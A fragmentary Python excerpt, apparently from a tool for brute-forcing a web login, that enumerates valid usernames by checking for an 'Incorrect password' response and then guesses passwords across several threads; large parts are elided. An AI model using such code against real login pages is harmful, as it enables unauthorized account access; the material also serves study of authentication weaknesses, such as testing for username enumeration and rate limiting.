...
def makeRequestUsername(s,url,data,data_founded):
    r = s.post(url, data=data)
    if r.status_code == 200 and 'Incorrect password' in r.text:
        data_founded.append(data['username'])

def makeRequestPwd(s,url,data,pwd_founded):
        ...
        while username != '':
            for i in range(0,threads):
                if username != '': 
                    ...
                    t = threading.Thread(target=makeRequestUsername,args=[s,url,data,username_found])
        ...
        while password != '':
            for i in range(0,threads):
                if password != '': 
                    ...
                    t = threading.Thread(target=makeRequestPwd,args=[s,url,data,password_found])
                    thread_list.append(t)
                    t.start()
                else:
                    break
